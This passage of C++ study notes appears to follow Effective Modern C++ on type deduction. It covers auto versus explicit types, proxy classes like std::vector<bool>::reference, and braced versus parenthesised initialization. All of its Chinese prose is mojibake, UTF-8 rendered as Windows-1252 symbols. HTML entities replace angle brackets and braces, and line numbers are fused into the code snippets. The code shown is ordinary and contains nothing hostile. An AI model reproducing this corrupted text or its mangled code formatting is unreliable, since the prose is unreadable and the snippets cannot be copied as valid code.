åœ¨GNUå’ŒClangçš„ç¼–è¯‘å™¨ç¯å¢ƒä¸‹ï¼Œä½¿ç”¨Boost.TypeIndexç‰ˆæœ¬çš„fæœ€åä¼šäº§ç”Ÿä¸‹é¢çš„ï¼ˆå‡†ç¡®çš„ï¼‰è¾“å‡ºï¼š 12T = Widget const *param = Widget const * const&amp; åœ¨Microsoftçš„ç¼–è¯‘å™¨ç¯å¢ƒä¸‹ï¼Œç»“æœä¹Ÿæ˜¯æå…¶ç›¸ä¼¼ï¼š 12T = class Widget const *param = class Widget const * const &amp; ç»“è®º ç±»å‹æ¨æ–­å¯ä»¥ä½¿ç”¨IDEï¼Œä½¿ç”¨ç¼–è¯‘å™¨æŠ¥é”™ï¼Œä½¿ç”¨Boost.TypeIndexåº“ è¿™äº›å·¥å…·å¯èƒ½æ—¢ä¸å‡†ç¡®ä¹Ÿæ— å¸®åŠ©ï¼Œæ‰€ä»¥ç†è§£C++ç±»å‹æ¨å¯¼è§„åˆ™æ‰æ˜¯æœ€é‡è¦çš„ 5 ä¼˜å…ˆè€ƒè™‘autoè€Œéæ˜¾å¼ç±»å‹å£°æ˜ ä»ç¨‹åºå‘˜çš„è§’åº¦æ¥è¯´ï¼Œå¦‚æœæŒ‰ç…§ç¬¦åˆè§„å®šçš„æµç¨‹èµ°ï¼Œé‚£autoç±»å‹æ¨å¯¼çš„ä¸€äº›ç»“æœæ˜¯é”™è¯¯çš„ã€‚å½“è¿™äº›æƒ…å†µå‘ç”Ÿæ—¶ï¼Œå¼•å¯¼autoäº§ç”Ÿæ­£ç¡®çš„ç»“æœæ˜¯å¾ˆé‡è¦çš„ã€‚ autoå˜é‡ä»åˆå§‹åŒ–è¡¨è¾¾å¼ä¸­æ¨å¯¼å‡ºç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»åˆå§‹åŒ–ã€‚ 12345678910111213141516171819int x1; //æ½œåœ¨çš„æœªåˆå§‹åŒ–çš„å˜é‡ auto x2; //é”™è¯¯ï¼å¿…é¡»è¦åˆå§‹åŒ–auto x3 = 0; //æ²¡é—®é¢˜ï¼Œxå·²ç»å®šä¹‰äº†template&lt;typename It&gt; void dwim(It b,It e)&#123; while (b != e) &#123; auto currValue = *b; â€¦ &#125;&#125;auto derefUPLess = [](const std::unique_ptr&lt;Widget&gt; &amp;p1, //ç”¨äºstd::unique_ptr const std::unique_ptr&lt;Widget&gt; &amp;p2) //æŒ‡å‘çš„Widgetç±»å‹çš„ &#123; return *p1 &lt; *p2; &#125;; //æ¯”è¾ƒå‡½æ•° å¦‚æœä½¿ç”¨C++14ï¼Œå°†ä¼šå˜å¾—æ›´é…·ï¼Œå› ä¸ºlambdaè¡¨è¾¾å¼ä¸­çš„å½¢å‚ä¹Ÿå¯ä»¥ä½¿ç”¨autoï¼š 1234567891011auto derefLess = //C++14ç‰ˆæœ¬ [](const auto&amp; p1, //è¢«ä»»ä½•åƒæŒ‡é’ˆä¸€æ ·çš„ä¸œè¥¿ const auto&amp; p2) //æŒ‡å‘çš„å€¼çš„æ¯”è¾ƒå‡½æ•° &#123; return *p1 &lt; *p2; &#125;;// ä¹Ÿå³std::function&lt;bool(const std::unique_ptr&lt;Widget&gt; &amp;, const std::unique_ptr&lt;Widget&gt; &amp;)&gt;derefUPLess = [](const std::unique_ptr&lt;Widget&gt; &amp;p1, const std::unique_ptr&lt;Widget&gt; &amp;p2) &#123; return *p1 &lt; *p2; &#125;; å®ä¾‹åŒ–std::functionå¹¶å£°æ˜ä¸€ä¸ªå¯¹è±¡è¿™ä¸ªå¯¹è±¡å°†ä¼šæœ‰å›ºå®šçš„å¤§å°ã€‚è¿™ä¸ªå¤§å°å¯èƒ½ä¸è¶³ä»¥å­˜å‚¨ä¸€ä¸ªé—­åŒ…ï¼Œè¿™ä¸ªæ—¶å€™std::functionçš„æ„é€ å‡½æ•°å°†ä¼šåœ¨å †ä¸Šé¢åˆ†é…å†…å­˜æ¥å­˜å‚¨ï¼Œè¿™å°±é€ æˆäº†ä½¿ç”¨std::functionæ¯”autoå£°æ˜å˜é‡ä¼šæ¶ˆè€—æ›´å¤šçš„å†…å­˜ã€‚ é€šè¿‡std::functionè°ƒç”¨ä¸€ä¸ªé—­åŒ…å‡ ä¹æ— ç–‘æ¯”autoå£°æ˜çš„å¯¹è±¡è°ƒç”¨è¦æ…¢ã€‚æ¢å¥è¯è¯´ï¼Œstd::functionæ–¹æ³•æ¯”autoæ–¹æ³•è¦æ›´è€—ç©ºé—´ä¸”æ›´æ…¢ï¼Œè¿˜å¯èƒ½æœ‰out-of-memoryå¼‚å¸¸ã€‚å¹¶ä¸”æ­£å¦‚ä¸Šé¢çš„ä¾‹å­ï¼Œæ¯”èµ·å†™std::functionå®ä¾‹åŒ–çš„ç±»å‹æ¥ï¼Œä½¿ç”¨autoè¦æ–¹ä¾¿å¾—å¤šã€‚ è€ƒè™‘ä»¥ä¸‹é—®é¢˜ï¼š 123std::vector&lt;int&gt; v;â€¦unsigned sz = v.size(); v.size()çš„æ ‡å‡†è¿”å›ç±»å‹æ˜¯std::vector&lt;int&gt;::size_typeï¼Œä½†æ˜¯åªæœ‰å°‘æ•°å¼€å‘è€…æ„è¯†åˆ°è¿™ç‚¹ã€‚std::vector&lt;int&gt;::size_typeå®é™…ä¸Šè¢«æŒ‡å®šä¸ºæ— ç¬¦å·æ•´å‹ã€‚ä¸Šè¿°çš„ä»£ç ï¼Œä¼šé€ æˆä¸€äº›æœ‰è¶£çš„ç»“æœã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨Windows 32-bitä¸Šstd::vector&lt;int&gt;::size_typeå’Œunsignedæ˜¯ä¸€æ ·çš„å¤§å°ï¼Œä½†æ˜¯åœ¨Windows 64-bitä¸Šstd::vector&lt;int&gt;::size_typeæ˜¯64ä½ï¼Œunsignedæ˜¯32ä½ã€‚è¿™æ„å‘³ç€è¿™æ®µä»£ç åœ¨Windows 32-bitä¸Šæ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯å½“æŠŠåº”ç”¨ç¨‹åºç§»æ¤åˆ°Windows 64-bitä¸Šæ—¶å°±å¯èƒ½ä¼šå‡ºç°ä¸€äº›é—®é¢˜ã€‚ æ‰€ä»¥ä½¿ç”¨autoå¯ä»¥ç¡®ä¿ä½ ä¸éœ€è¦æµªè´¹æ—¶é—´ï¼š 1auto sz =v.size(); //szçš„ç±»å‹æ˜¯std::vector&lt;int&gt;::size_type è€ƒè™‘ä¸‹é¢çš„ä»£ç ï¼š 1234567std::unordered_map&lt;std::string, int&gt; m;â€¦for(const std::pair&lt;std::string, int&gt;&amp; p : m)&#123; â€¦ //ç”¨påšä¸€äº›äº‹&#125; çœ‹èµ·æ¥å¥½åƒå¾ˆåˆæƒ…åˆç†çš„è¡¨è¾¾ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼š std::unordered_mapçš„keyæ˜¯constçš„ï¼Œæ‰€ä»¥hash tableä¸­çš„std::pairçš„ç±»å‹ä¸æ˜¯std::pair&lt;std::string, int&gt;ï¼Œè€Œæ˜¯std::pair&lt;const std::string, int&gt;ã€‚ ç¼–è¯‘å™¨ä¼šåŠªåŠ›çš„æ‰¾åˆ°ä¸€ç§æ–¹æ³•æŠŠstd::pair&lt;const std::string, int&gt;ï¼ˆå³hash tableä¸­çš„ä¸œè¥¿ï¼‰è½¬æ¢ä¸ºstd::pair&lt;std::string, int&gt;ï¼ˆpçš„å£°æ˜ç±»å‹ï¼‰ã€‚å®ƒä¼šæˆåŠŸçš„ï¼Œå› ä¸ºå®ƒä¼šé€šè¿‡æ‹·è´mä¸­çš„å¯¹è±¡åˆ›å»ºä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼Œæ˜¯mä¸­å…ƒç´ çš„ç±»å‹ã€‚ç„¶åæŠŠpçš„å¼•ç”¨ç»‘å®šåˆ°è¿™ä¸ªä¸´æ—¶å¯¹è±¡ä¸Šã€‚åœ¨æ¯ä¸ªå¾ªç¯è¿­ä»£ç»“æŸæ—¶ï¼Œä¸´æ—¶å¯¹è±¡å°†ä¼šé”€æ¯ã€‚ æ‰€ä»¥ä¸åªæ˜¯è®©pæŒ‡å‘mä¸­å„ä¸ªå…ƒç´ çš„å¼•ç”¨è€Œå·²ã€‚ ä½¿ç”¨autoå¯ä»¥é¿å…è¿™äº›å¾ˆéš¾è¢«æ„è¯†åˆ°çš„ç±»å‹ä¸åŒ¹é…çš„é”™è¯¯ï¼š 123for(const auto&amp; p : m) &#123; â€¦ //å¦‚ä¹‹å‰ä¸€æ ·&#125; è¿™æ ·æ— ç–‘æ›´å…·æ•ˆç‡ï¼Œä¸”æ›´å®¹æ˜“ä¹¦å†™ã€‚è€Œä¸”ï¼Œè¿™ä¸ªä»£ç æœ‰ä¸€ä¸ªéå¸¸å¸å¼•äººçš„ç‰¹æ€§ï¼Œå¦‚æœä½ è·å–pçš„åœ°å€ï¼Œä½ ç¡®å®ä¼šå¾—åˆ°ä¸€ä¸ªæŒ‡å‘mä¸­å…ƒç´ çš„æŒ‡é’ˆã€‚åœ¨æ²¡æœ‰autoçš„ç‰ˆæœ¬ä¸­pä¼šæŒ‡å‘ä¸€ä¸ªä¸´æ—¶å˜é‡ï¼Œè¿™ä¸ªä¸´æ—¶å˜é‡åœ¨æ¯æ¬¡è¿­ä»£å®Œæˆæ—¶ä¼šè¢«é”€æ¯ã€‚ è®²ç©¶ï¼ æœ‰æ—¶å€™ï¼Œæ˜¾å¼çš„æŒ‡å®šç±»å‹å¯èƒ½ä¼šå¯¼è‡´ä½ ä¸æƒ³çœ‹åˆ°çš„ç±»å‹è½¬æ¢ã€‚å¦‚æœä½ ä½¿ç”¨autoå£°æ˜ç›®æ ‡å˜é‡ä½ å°±ä¸å¿…æ‹…å¿ƒè¿™ä¸ªé—®é¢˜ã€‚ ç„¶è€Œautoä¹Ÿä¸æ˜¯å®Œç¾çš„ã€‚æ¯ä¸ªautoå˜é‡éƒ½ä»åˆå§‹åŒ–è¡¨è¾¾å¼ä¸­æ¨å¯¼ç±»å‹ï¼Œæœ‰ä¸€äº›è¡¨è¾¾å¼çš„ç±»å‹å’Œæˆ‘ä»¬æœŸæœ›çš„å¤§ç›¸å¾„åº­ï¼Œæ¯”å¦‚åœ¨ ç†è§£autoç±»å‹æ¨å¯¼ å°ç»“çš„å†…å®¹ã€‚ å¦å¤–ï¼Œä¸€ä¸ªé€‚å½“çš„å˜é‡åç§°å°±èƒ½ä½“ç°å¤§é‡çš„æŠ½è±¡ç±»å‹ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸ç”¨è€ƒè™‘ auto å¸¦æ¥çš„ä¿¡æ¯ä¸å¯è§æ€§ã€‚ ç»“è®º autoå˜é‡å¿…é¡»åˆå§‹åŒ–ï¼Œé€šå¸¸å®ƒå¯ä»¥é¿å…ä¸€äº›ç§»æ¤æ€§å’Œæ•ˆç‡æ€§çš„é—®é¢˜ï¼Œä¹Ÿä½¿å¾—é‡æ„æ›´æ–¹ä¾¿ï¼Œè¿˜èƒ½è®©ä½ å°‘æ‰“å‡ ä¸ªå­—ã€‚ æ³¨æ„ auto å¯èƒ½å‡ºç°ä¸€äº›ç±»å‹æ¨å¯¼ä¸ä¸€è‡´çš„é—®é¢˜ã€‚ 6 auto é‡ä¸Šä»£ç†ç±»å‹ï¼Œä½¿ç”¨æ˜¾å¼ç±»å‹åˆå§‹åŒ– å‡å¦‚æˆ‘æœ‰ä¸€ä¸ªå‡½æ•°ï¼Œå‚æ•°ä¸ºWidgetï¼Œè¿”å›ä¸€ä¸ªstd::vector&lt;bool&gt;ï¼Œè¿™é‡Œçš„boolè¡¨ç¤ºWidgetæ˜¯å¦æä¾›ä¸€ä¸ªç‹¬æœ‰çš„ç‰¹æ€§ã€‚ 1std::vector&lt;bool&gt; features(const Widget&amp; w); æ›´è¿›ä¸€æ­¥å‡è®¾ç¬¬5ä¸ªbitè¡¨ç¤ºWidgetæ˜¯å¦å…·æœ‰é«˜ä¼˜å…ˆçº§ï¼Œæˆ‘ä»¬å¯ä»¥å†™è¿™æ ·çš„ä»£ç ï¼š 12345Widget w;â€¦bool highPriority = features(w)[5]; //wé«˜ä¼˜å…ˆçº§å—ï¼Ÿâ€¦processWidget(w, highPriority); //æ ¹æ®å®ƒçš„ä¼˜å…ˆçº§å¤„ç†w è¿™ä¸ªä»£ç æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚å®ƒä¼šæ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä½¿ç”¨autoä»£æ›¿highPriorityçš„æ˜¾å¼æŒ‡å®šç±»å‹åšä¸€äº›çœ‹èµ·æ¥å¾ˆæ— å®³çš„æ”¹å˜ï¼š 1auto highPriority = features(w)[5]; //wé«˜ä¼˜å…ˆçº§å—ï¼Ÿ æƒ…å†µå˜äº†ã€‚æ‰€æœ‰ä»£ç ä»ç„¶å¯ç¼–è¯‘ï¼Œä½†æ˜¯è¡Œä¸ºä¸å†å¯é¢„æµ‹ï¼š 1processWidget(w,highPriority); //æœªå®šä¹‰è¡Œä¸ºï¼ å› ä¸º features(w)[5] è°ƒç”¨ operator[]ä¸ä¼šè¿”å›å®¹å™¨ä¸­å…ƒç´ çš„å¼•ç”¨ï¼Œå–è€Œä»£ä¹‹å®ƒè¿”å›ä¸€ä¸ªstd::vector&lt;bool&gt;::referenceçš„å¯¹è±¡ã€‚ è°ƒç”¨featureså°†è¿”å›ä¸€ä¸ªstd::vector&lt;bool&gt;ä¸´æ—¶å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ²¡æœ‰åå­—ï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬çš„è®¨è®ºï¼Œæˆ‘è¿™é‡Œå«ä»–tempã€‚operator[]åœ¨tempä¸Šè°ƒç”¨ï¼Œå®ƒè¿”å›çš„std::vector&lt;bool&gt;::referenceåŒ…å«ä¸€ä¸ªæŒ‡å‘å­˜ç€è¿™äº› bits çš„æŒ‡é’ˆï¼ˆtempç®¡ç†è¿™äº›bitsï¼‰ã€‚highPriorityæ˜¯è¿™ä¸ªstd::vector&lt;bool&gt;::referenceçš„æ‹·è´ï¼Œæ‰€ä»¥highPriorityä¹ŸåŒ…å«ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘tempä¸­çš„ç®¡ç† bits ã€‚åœ¨è¿™ä¸ªè¯­å¥ç»“æŸçš„æ—¶å€™tempå°†ä¼šè¢«é”€æ¯ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªä¸´æ—¶å˜é‡ã€‚å› æ­¤highPriorityåŒ…å«ä¸€ä¸ªæ‚¬æŒ‚ï¼ˆdanglingï¼‰æŒ‡é’ˆï¼Œå¦‚æœç”¨äºprocessWidgetè°ƒç”¨ä¸­å°†ä¼šé€ æˆæœªå®šä¹‰è¡Œä¸ºï¼š 12processWidget(w, highPriority); //æœªå®šä¹‰è¡Œä¸ºï¼ //highPriorityåŒ…å«ä¸€ä¸ªæ‚¬ç½®æŒ‡é’ˆï¼ ä»£ç†ç±»é—®é¢˜ std::vector&lt;bool&gt;::referenceæ˜¯ä¸€ä¸ªä»£ç†ç±»ï¼ˆproxy classï¼‰çš„ä¾‹å­ï¼šæ‰€è°“ä»£ç†ç±»å°±æ˜¯ä»¥æ¨¡ä»¿å’Œå¢å¼ºä¸€äº›ç±»å‹çš„è¡Œä¸ºä¸ºç›®çš„è€Œå­˜åœ¨çš„ç±»ã€‚ C++æ ‡å‡†æ¨¡æ¿åº“ä¸­çš„æ™ºèƒ½æŒ‡é’ˆä¹Ÿæ˜¯ç”¨ä»£ç†ç±»å®ç°äº†å¯¹åŸå§‹æŒ‡é’ˆçš„èµ„æºç®¡ç†è¡Œä¸ºã€‚ ä¸€äº›ä»£ç†ç±»è¢«è®¾è®¡äºç”¨ä»¥å¯¹å®¢æˆ·å¯è§ã€‚æ¯”å¦‚std::shared_ptrå’Œstd::unique_ptrã€‚å…¶ä»–çš„ä»£ç†ç±»åˆ™æˆ–å¤šæˆ–å°‘ä¸å¯è§ï¼Œæ¯”å¦‚std::vector&lt;bool&gt;::referenceå°±æ˜¯ä¸å¯è§ä»£ç†ç±»çš„ä¸€ä¸ªä¾‹å­ï¼Œè¿˜æœ‰std::bitset::reference ç­‰ã€‚ ä¸€äº›C++åº“ä¹Ÿæ˜¯ç”¨äº†è¡¨è¾¾å¼æ¨¡æ¿ï¼ˆexpression templatesï¼‰çš„é»‘ç§‘æŠ€ã€‚è¿™äº›åº“é€šå¸¸è¢«ç”¨äºæé«˜æ•°å€¼è¿ç®—çš„æ•ˆç‡ã€‚ç»™å‡ºä¸€ä¸ªçŸ©é˜µç±»Matrixå’ŒçŸ©é˜µå¯¹è±¡m1ï¼Œm2ï¼Œm3ï¼Œm4ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œè¿™ä¸ªè¡¨è¾¾å¼ 1Matrix sum = m1 + m2 + m3 + m4; å¯ä»¥ä½¿è®¡ç®—æ›´åŠ é«˜æ•ˆï¼Œåªéœ€è¦ä½¿è®©operator+è¿”å›ä¸€ä¸ªä»£ç†ç±»ä»£ç†ç»“æœ Sum&lt;Matrix, Matrix&gt; è€Œä¸æ˜¯è¿”å›ç»“æœæœ¬èº«ã€‚ ä½œä¸ºä¸€ä¸ªé€šåˆ™ï¼Œä¸å¯è§çš„ä»£ç†ç±»é€šå¸¸ä¸é€‚ç”¨äºautoã€‚è¿™æ ·ç±»å‹çš„å¯¹è±¡çš„ç”Ÿå‘½æœŸé€šå¸¸ä¸ä¼šæ´»è¿‡ä¸€æ¡è¯­å¥ï¼Œæ‰€ä»¥åˆ›å»ºé‚£æ ·çš„å¯¹è±¡æ˜¯å±é™©çš„ã€‚ æ˜¾å¼ç±»å‹åˆå§‹åŒ–å™¨ï¼ˆthe explicitly typed initialized idiom) 1auto highPriority = static_cast&lt;bool&gt;(features(w)[5]); è¿™é‡Œï¼Œfeatures(w)[5]è¿˜æ˜¯è¿”å›ä¸€ä¸ªstd::vector&lt;bool&gt;::referenceå¯¹è±¡ï¼Œä½†æ˜¯è¿™ä¸ªè½¬å‹ä½¿å¾—è¡¨è¾¾å¼ç±»å‹ä¸ºboolï¼Œç„¶åautoæ‰è¢«ç”¨äºæ¨å¯¼highPriorityã€‚ 12auto sum = static_cast&lt;Matrix&gt;(m1 + m2 + m3 + m4);auto ep = static_cast&lt;float&gt;(calcEpsilon()); // è½¬æ¢ç²¾åº¦ ç»“è®º ä¸å¯è§çš„ä»£ç†ç±»å¯èƒ½ä¼šä½¿autoä»è¡¨è¾¾å¼ä¸­æ¨å¯¼å‡ºâ€œé”™è¯¯çš„â€ç±»å‹ æ˜¾å¼ç±»å‹åˆå§‹åŒ–å™¨å¼ºåˆ¶autoæ¨å¯¼å‡ºä½ æƒ³è¦çš„ç»“æœ 7 åŒºåˆ†()å’Œ{}åˆ›å»ºå¯¹è±¡ C++11ä½¿ç”¨ç»Ÿä¸€åˆå§‹åŒ–ï¼ˆuniform initializationï¼‰ 1std::vector&lt;int&gt; v&#123; 1, 3, 5 &#125;; //våˆå§‹å†…å®¹ä¸º1,3,5 C++11å…è®¸\"=\"åˆå§‹åŒ–ä¸åŠ èŠ±æ‹¬å·ä¹Ÿæ‹¥æœ‰è¿™ç§èƒ½åŠ›ï¼Œæ‹¬å·åˆå§‹åŒ–ä¹Ÿèƒ½è¢«ç”¨äºä¸ºéé™æ€æ•°æ®æˆå‘˜æŒ‡å®šé»˜è®¤åˆå§‹å€¼ï¼š 12345678class Widget&#123; â€¦private: int x&#123; 0 &#125;; //æ²¡é—®é¢˜ï¼Œxåˆå§‹å€¼ä¸º0 int y = 0; //ä¹Ÿå¯ä»¥ int z(0); //é”™è¯¯ï¼&#125; å¦ä¸€æ–¹é¢ï¼Œä¸å¯æ‹·è´çš„å¯¹è±¡ï¼ˆä¾‹å¦‚std::atomicï¼‰å¯ä»¥ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–æˆ–è€…åœ†æ‹¬å·åˆå§‹åŒ–ï¼Œä½†æ˜¯ä¸èƒ½ä½¿ç”¨\"=\"åˆå§‹åŒ–ï¼š 123std::atomic&lt;int&gt; ai1&#123; 0 &#125;; //æ²¡é—®é¢˜std::atomic&lt;int&gt; ai2(0); //æ²¡é—®é¢˜std::atomic&lt;int&gt; ai3 = 0; //é”™è¯¯ï¼ å†…ç½®ç±»å‹é—´çš„éšå¼å˜çª„è½¬æ¢ (narrowing conversion) æ‹¬å·è¡¨è¾¾å¼è¿˜æœ‰ä¸€ä¸ªå°‘è§çš„ç‰¹æ€§ï¼Œå³å®ƒä¸å…è®¸å†…ç½®ç±»å‹é—´éšå¼çš„å˜çª„è½¬æ¢ï¼ˆnarrowing conversionï¼‰ã€‚å¦‚æœä¸€ä¸ªä½¿ç”¨äº†æ‹¬å·åˆå§‹åŒ–çš„è¡¨è¾¾å¼çš„å€¼ï¼Œä¸èƒ½ä¿è¯ç”±è¢«åˆå§‹åŒ–çš„å¯¹è±¡çš„ç±»å‹æ¥è¡¨ç¤ºï¼Œä»£ç å°±ä¸ä¼šé€šè¿‡ç¼–è¯‘ï¼š 123double x, y, z;int sum1&#123; x + y + z &#125;; //é”™è¯¯ï¼doubleçš„å’Œå¯èƒ½ä¸èƒ½è¡¨ç¤ºä¸ºint ä½¿ç”¨åœ†æ‹¬å·å’Œ\"=\"çš„åˆå§‹åŒ–ä¸æ£€æŸ¥æ˜¯å¦è½¬æ¢ä¸ºå˜çª„è½¬æ¢ï¼Œå› ä¸ºç”±äºå†å²é—ç•™é—®é¢˜å®ƒä»¬å¿…é¡»è¦å…¼å®¹è€æ—§ä»£ç ï¼š 123int sum2(x + y +z); //å¯ä»¥ï¼ˆè¡¨è¾¾å¼çš„å€¼è¢«æˆªä¸ºintï¼‰int sum3 = x + y + z; //åŒä¸Š è¢«è¯¯è®¤ä¸ºæ˜¯å£°æ˜ C++è§„å®šä»»ä½•å¯ä»¥è¢«è§£æä¸ºä¸€ä¸ªå£°æ˜çš„ä¸œè¥¿å¿…é¡»è¢«è§£æä¸ºå£°æ˜ã€‚ 1Widget w1(10); //ä½¿ç”¨å®å‚10è°ƒç”¨Widgetçš„ä¸€ä¸ªæ„é€ å‡½æ•° ä½†æ˜¯å¦‚æœä½ å°è¯•ä½¿ç”¨ç›¸ä¼¼çš„è¯­æ³•è°ƒç”¨Widgetæ— å‚æ„é€ å‡½æ•°ï¼Œå®ƒå°±ä¼šå˜æˆå‡½æ•°å£°æ˜ï¼š 1Widget w2(); //æœ€ä»¤äººå¤´ç–¼çš„è§£æï¼å£°æ˜ä¸€ä¸ªå‡½æ•°w2ï¼Œè¿”å›Widget ç”±äºå‡½æ•°å£°æ˜ä¸­å½¢å‚åˆ—è¡¨ä¸èƒ½å¸¦èŠ±æ‹¬å·ï¼Œæ‰€ä»¥ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–è¡¨æ˜ä½ æƒ³è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°æ„é€ å¯¹è±¡å°±æ²¡æœ‰é—®é¢˜ï¼š 1Widget w3&#123;&#125;; //è°ƒç”¨æ²¡æœ‰å‚æ•°çš„æ„é€ å‡½æ•°æ„é€ å¯¹è±¡ initializer_listå…³è”é—®é¢˜ åœ¨æ„é€ å‡½æ•°è°ƒç”¨ä¸­ï¼Œåªè¦ä¸åŒ…å«std::initializer_listå½¢å‚ï¼Œé‚£ä¹ˆèŠ±æ‹¬å·åˆå§‹åŒ–å’Œåœ†æ‹¬å·åˆå§‹åŒ–éƒ½ä¼šäº§ç”Ÿä¸€æ ·çš„ç»“æœï¼š 12345678910class Widget &#123; public: Widget(int i, bool b); //æ„é€ å‡½æ•°æœªå£°æ˜ Widget(int i, double d); //std::initializer_listè¿™ä¸ªå½¢å‚ â€¦&#125;;Widget w1(10, true); //è°ƒç”¨ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°Widget w2&#123;10, true&#125;; //ä¹Ÿè°ƒç”¨ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°Widget w3(10, 5.0); //è°ƒç”¨ç¬¬äºŒä¸ªæ„é€ å‡½æ•°Widget w4&#123;10, 5.0&#125;; //ä¹Ÿè°ƒç”¨ç¬¬äºŒä¸ªæ„é€ å‡½æ•° ç„¶è€Œï¼Œå¦‚æœæœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ„é€ å‡½æ•°çš„å£°æ˜åŒ…å«ä¸€ä¸ªstd::initializer_listå½¢å‚ï¼Œé‚£ä¹ˆä½¿ç”¨æ‹¬å·åˆå§‹åŒ–è¯­æ³•çš„è°ƒç”¨æ›´å€¾å‘äºé€‰æ‹©å¸¦std::initializer_listçš„é‚£ä¸ªæ„é€ å‡½æ•°ã€‚ 1234567class Widget &#123; public: Widget(int i, bool b); //åŒä¸Š Widget(int i, double d); //åŒä¸Š Widget(std::initializer_list&lt;long double&gt; il); //æ–°æ·»åŠ çš„ â€¦&#125;; w2å’Œw4å°†ä¼šä½¿ç”¨æ–°æ·»åŠ çš„æ„é€ å‡½æ•°ï¼Œå³ä½¿å¦ä¸€ä¸ªéstd::initializer_listæ„é€ å‡½æ•°å’Œå®å‚æ›´åŒ¹é…ï¼š 12345678910111213Widget w1(10, true); //ä½¿ç”¨åœ†æ‹¬å·åˆå§‹åŒ–ï¼ŒåŒä¹‹å‰ä¸€æ · //è°ƒç”¨ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°Widget w2&#123;10, true&#125;; //ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–ï¼Œä½†æ˜¯ç°åœ¨ //è°ƒç”¨å¸¦std::initializer_listçš„æ„é€ å‡½æ•° //(10 å’Œ true è½¬åŒ–ä¸ºlong double)Widget w3(10, 5.0); //ä½¿ç”¨åœ†æ‹¬å·åˆå§‹åŒ–ï¼ŒåŒä¹‹å‰ä¸€æ · //è°ƒç”¨ç¬¬äºŒä¸ªæ„é€ å‡½æ•° Widget w4&#123;10, 5.0&#125;; //ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–ï¼Œä½†æ˜¯ç°åœ¨ //è°ƒç”¨å¸¦std::initializer_listçš„æ„é€ å‡½æ•° //(10 å’Œ 5.0 è½¬åŒ–ä¸ºlong double) ç¼–è¯‘å™¨ä¸€é‡åˆ°æ‹¬å·åˆå§‹åŒ–å°±é€‰æ‹©å¸¦std::initializer_listçš„æ„é€ å‡½æ•°çš„å†³å¿ƒæ˜¯å¦‚æ­¤å¼ºçƒˆï¼Œä»¥è‡³äºå°±ç®—å¸¦std::initializer_listçš„æ„é€ å‡½æ•°ä¸èƒ½è¢«è°ƒç”¨ï¼Œå®ƒä¹Ÿä¼šç¡¬é€‰ã€‚ 123456789class Widget &#123; public: Widget(int i, bool b); //åŒä¹‹å‰ä¸€æ · Widget(int i, double d); //åŒä¹‹å‰ä¸€æ · Widget(std::initializer_list&lt;bool&gt; il); //ç°åœ¨å…ƒç´ ç±»å‹ä¸ºbool â€¦ //æ²¡æœ‰éšå¼è½¬æ¢å‡½æ•°&#125;;Widget w&#123;10, 5.0&#125;; //é”™è¯¯ï¼è¦æ±‚å˜çª„è½¬æ¢ è¿™é‡Œï¼Œç¼–è¯‘å™¨ä¼šç›´æ¥å¿½ç•¥å‰é¢ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼ˆå…¶ä¸­ç¬¬äºŒä¸ªæ„é€ å‡½æ•°æ˜¯æ‰€æœ‰å®å‚ç±»å‹çš„æœ€ä½³åŒ¹é…ï¼‰ï¼Œç„¶åå°è¯•è°ƒç”¨std::initializer_list&lt;bool&gt;æ„é€ å‡½æ•°ã€‚è°ƒç”¨è¿™ä¸ªå‡½æ•°å°†ä¼šæŠŠint(10)å’Œdouble(5.0)è½¬æ¢ä¸ºboolï¼Œç”±äºä¼šäº§ç”Ÿå˜çª„è½¬æ¢ï¼ˆboolä¸èƒ½å‡†ç¡®è¡¨ç¤ºå…¶ä¸­ä»»ä½•ä¸€ä¸ªå€¼ï¼‰ï¼Œæ‹¬å·åˆå§‹åŒ–æ‹’ç»å˜çª„è½¬æ¢ï¼Œæ‰€ä»¥è¿™ä¸ªè°ƒç”¨æ— æ•ˆï¼Œä»£ç æ— æ³•é€šè¿‡ç¼–è¯‘ã€‚ åªæœ‰å½“æ²¡åŠæ³•æŠŠæ‹¬å·åˆå§‹åŒ–ä¸­å®å‚çš„ç±»å‹è½¬åŒ–ä¸ºstd::initializer_listæ—¶ï¼Œç¼–è¯‘å™¨æ‰ä¼šå›åˆ°æ­£å¸¸çš„å‡½æ•°å†³è®®æµç¨‹ä¸­ã€‚ 12345678910111213class Widget &#123; public: Widget(int i, bool b); //åŒä¹‹å‰ä¸€æ · Widget(int i, double d); //åŒä¹‹å‰ä¸€æ · //ç°åœ¨std::initializer_listå…ƒç´ ç±»å‹ä¸ºstd::string Widget(std::initializer_list&lt;std::string&gt; il); â€¦ //æ²¡æœ‰éšå¼è½¬æ¢å‡½æ•°&#125;;Widget w1(10, true); // ä½¿ç”¨åœ†æ‹¬å·åˆå§‹åŒ–ï¼Œè°ƒç”¨ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°Widget w2&#123;10, true&#125;; // ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–ï¼Œç°åœ¨è°ƒç”¨ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°Widget w3(10, 5.0); // ä½¿ç”¨åœ†æ‹¬å·åˆå§‹åŒ–ï¼Œè°ƒç”¨ç¬¬äºŒä¸ªæ„é€ 